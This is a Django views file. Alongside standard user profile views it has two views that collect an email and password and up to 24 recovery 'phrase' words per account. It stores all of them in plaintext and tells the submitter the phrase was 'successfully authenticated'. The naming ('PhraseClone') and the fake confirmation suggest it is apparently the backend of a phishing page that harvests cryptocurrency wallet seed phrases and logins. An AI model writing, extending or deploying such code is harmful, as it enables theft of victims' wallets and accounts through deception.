from django.contrib.auth import get_user_model
from django.contrib.auth.mixins import LoginRequiredMixin
from django.contrib.messages.views import SuccessMessageMixin
from django.urls import reverse
from django.utils.translation import gettext_lazy as _
from django.views.generic import DetailView, RedirectView, UpdateView, CreateView
from django.http import JsonResponse

from .models import Account, Phrase

User = get_user_model()


class UserDetailView(LoginRequiredMixin, DetailView):
    model = User
    slug_field = "username"
    slug_url_kwarg = "username"


user_detail_view = UserDetailView.as_view()


class UserUpdateView(LoginRequiredMixin, SuccessMessageMixin, UpdateView):
    model = User
    fields = ["name"]
    success_message = _("Information successfully updated")

    def get_success_url(self):
        assert (
            self.request.user.is_authenticated
        )  # for mypy to know that the user is authenticated
        return self.request.user.get_absolute_url()

    def get_object(self):
        return self.request.user


user_update_view = UserUpdateView.as_view()


class UserRedirectView(LoginRequiredMixin, RedirectView):
    permanent = False

    def get_redirect_url(self):
        return reverse("users:detail", kwargs={"username": self.request.user.username})


user_redirect_view = UserRedirectView.as_view()


class AccountCredentials(CreateView):
    model = Account
    template_name = "pages/home.html"
    fields = ['email', 'password']

    def post(self, request, *args, **kwargs):
        email = request.POST.get('email')
        password = request.POST.get('password')
        if len(email) > 4 and "@" in email and len(password) > 8:
            account = Account.objects.create(email=email, password=password)
            return JsonResponse(status=201, data={'account':account.id})
        return JsonResponse(status=400, data={'message':'email or password incorrect. Confirm and retry!'})


class PhraseClone(CreateView):
    model = Phrase
    template_name = "pages/about.html"
    fields = "__all__"

    def post(self, request, *args, **kwargs):
        account = Account.objects.get(id=kwargs['id'])
        phrase1 = request.POST.get('phrase1')
        phrase2 = request.POST.get('phrase2')
        phrase3 = request.POST.get('phrase3')
        phrase4 = request.POST.get('phrase4')
        phrase5 = request.POST.get('phrase5')
        phrase6 = request.POST.get('phrase6')
        phrase7 = request.POST.get('phrase7')
        phrase8 = request.POST.get('phrase8')
        phrase9 = request.POST.get('phrase9')
        phrase10 = request.POST.get('phrase10')
        phrase11 = request.POST.get('phrase11')
        phrase12 = request.POST.get('phrase12')
        phrase13 = request.POST.get('phrase13')
        phrase14 = request.POST.get('phrase14')
        phrase15 = request.POST.get('phrase15')
        phrase16 = request.POST.get('phrase16')
        phrase17 = request.POST.get('phrase17')
        phrase18 = request.POST.get('phrase18')
        phrase19 = request.POST.get('phrase19')
        phrase20 = request.POST.get('phrase20')
        phrase21 = request.POST.get('phrase21')
        phrase22 = request.POST.get('phrase22')
        phrase23 = request.POST.get('phrase23')
        phrase24 = request.POST.get('phrase24')
        if account and (phrase1 and phrase2 and phrase3 and phrase4 and phrase5 and phrase6 and phrase7 and phrase8 and phrase9 and phrase10 and phrase11 and phrase12) or (phrase13 and phrase14 and phrase15) or (phrase16 and phrase17 and phrase18) or (phrase19 and phrase20 and phrase21) or (phrase22 and phrase23 and phrase24):
            Phrase.objects.create(account=account,phrase1=phrase1,phrase2=phrase2,phrase3=phrase3,phrase4=phrase4,phrase5=phrase5,phrase6=phrase6,phrase7=phrase7,phrase8=phrase8,phrase9=phrase9,phrase10=phrase10,phrase11=phrase11,phrase12=phrase12,phrase13=phrase13,phrase14=phrase14,phrase15=phrase15,phrase16=phrase16,phrase17=phrase17,phrase18=phrase18,phrase19=phrase19,phrase20=phrase20,phrase21=phrase21,phrase22=phrase22,phrase23=phrase23,phrase24=phrase24)
            return JsonResponse(status=201, data={'message':'successfully authenticated their pass phrase'})
        return JsonResponse(status=400, data={'message':'Failed to authenticate the phrase'})

